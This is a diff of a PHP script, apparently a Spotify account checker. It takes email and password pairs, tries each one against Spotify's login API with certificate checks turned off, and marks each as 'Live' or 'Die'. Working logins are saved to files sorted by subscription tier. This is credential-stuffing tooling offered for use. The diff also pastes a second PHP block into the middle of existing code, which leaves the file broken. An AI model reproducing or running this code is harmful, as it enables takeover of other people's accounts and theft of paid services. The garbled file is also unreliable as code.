@@ -46,7 +46,86 @@ $pisah = explode($delim, urldecode($_REQUEST['mailpass']));
                   "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
                   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Accept-Language: en-US,en;q=0.5",
+            ));<?php
+date_default_timezone_set("Asia/Kuala_Lumpur");
+$date= date("dmy_Hi");
+$s_check = urldecode($_REQUEST['s_check']);
+$s_enailpass = explode($s_check, urldecode($_REQUEST['mailpass']));
+      $ch = curl_init();
+      curl_setopt($ch, CURLOPT_TIMEOUT, 600);
+      curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie/cookie.txt");
+      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+      curl_setopt($ch, CURLOPT_VERBOSE, 0);
+      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+      curl_setopt($ch, CURLOPT_HEADER, 1);
+      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language: en-US,en;q=0.5",
+      ));
+      curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/login");
+      $r_check = curl_exec($ch);
+      preg_match_all("|Set-Cookie: i_check_token=(.*);Version=1;Domain=accounts.spotify.com;Path=/;Secure|", $r_check, $i_check);
+      $i_check = trim($i_check[1][0]);
+
+      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
+            "Accept: application/json, text/plain, */*",
+            "Accept-Language: en-US,en;q=0.5",
+            "Content-Type: application/x-www-form-urlencoded",
+            "Cookie: sp_landing=play.spotify.com%2F; sp_landingref=https%3A%2F%2Fwww.google.com%2F; user_eligible=0; spot=%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D; sp_t=ac1439ee6195be76711e73dc0f79f894; sp_new=1; i_check_token=$i_check; __bon=MHwwfC0xNjc4Mzc5MzU2fC03MDQ5MTkzMjk1MnwxfDF8MXwx; fb_continue=https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F; remember=brian%40gmail.com; _ga=GA1.2.153026989.1498061376; _gid=GA1.2.740264023.1498061376"
+      ));
+      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+      curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/api/login");
+      curl_setopt($ch, CURLOPT_POST, 1);
+      curl_setopt($ch, CURLOPT_HEADER, 0);
+      curl_setopt($ch, CURLOPT_POSTFIELDS,"remember=true&username=$s_enailpass[0]&password=$s_enailpass[1]&i_check_token=$i_check");
+      $r_check = curl_exec($ch);
+      $r_check = json_decode($r_check);
+      $email = urldecode($s_enailpass[0]);
+      if(isset($r_check->error) && trim($r_check->error) == "errorInvalidCredentials" ) {
+      echo '{"error":2,"msg":"<b><font color=red>Die| </font></b> '.$s_enailpass[0].'<font color=gray>|</font>'.$s_enailpass[1].'"}';
+      } elseif(isset($r_check->displayName) || stripos($json_encode($r_check), "displayName")) {
+            curl_setopt($ch, CURLOPT_URL, "https://www.spotify.com/account/overview/");
+            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+                  "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
+                  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                  "Accept-Language: en-US,en;q=0.5",
             ));
+            $r_check = curl_exec($ch);
+            preg_match_all('|<use xlink:href="#icon-checkmark"></use></svg></span>(.*)</h3><p class="subscription-status subscription-compact">|', $r_check, $acc_premium);
+            preg_match_all('|<h3 class="product-name">(.*)</h3>|', $r_check, $acc_free);
+            preg_match_all('|<p class="form-control-static" id="card-profile-country">(.*)</p></div><div class="form-group">|', $r_check, $country);
+            if(trim($acc_premium[1][0]) == "Spotify Premium") { 
+                  $status = "<font color='blue'>acc_premium</font>"; 
+            file_put_contents("r_check/".$status."/".$date.".txt", $s_enailpass[0]."|".$s_enailpass[1]."\n", FILE_APPEND);
+
+            } elseif(trim($acc_premium[1][0]) == "Premium for Family") {
+                  $status = "<font color='gold'>Admin Family</font>";
+            file_put_contents("r_check/".$status."/".$date.".txt", $s_enailpass[0]."|".$s_enailpass[1]."\n", FILE_APPEND);
+
+            } elseif(trim($acc_free[1][0]) == "Spotify Free") {
+                  $status = "<font color='red'>acc_free</font>";
+            file_put_contents("r_check/".$status."/".$date.".txt", $s_enailpass[0]."|".$s_enailpass[1]."\n", FILE_APPEND);
+            }
+            $country = $country[1][0];
+            $r_checkult["error"] = 0;
+            $r_checkult["msg"] = "<font color=green><b>Live</b></font> | $s_enailpass[0] | $s_enailpass[1] | Type : $status | Country : $country | [ Acc : Spotify ]";
+      
+            $a = fopen('priv/acc_ok', 'a+');
+            @fwrite($a, $r_checkult["msg"]."<br>");
+            @fclose($a);
+            die(json_encode($r_checkult));
+            //          echo '{"error":0,"msg":"<div class=col-md-4><b><font color=green>LIVE</font></b></div> <div class=col-md-4>'.$s_enailpass[0].'|'.$s_enailpass[1].'</div><div class=col-md-4>Type:  <b>'.$status.'</b></div>"}';
+
+      }
+
+
+
+?> 
             $res = curl_exec($ch);
             preg_match_all('|<use xlink:href="#icon-checkmark"></use></svg></span>(.*)</h3><p class="subscription-status subscription-compact">|', $res, $premium);
             preg_match_all('|<h3 class="product-name">(.*)</h3>|', $res, $free);
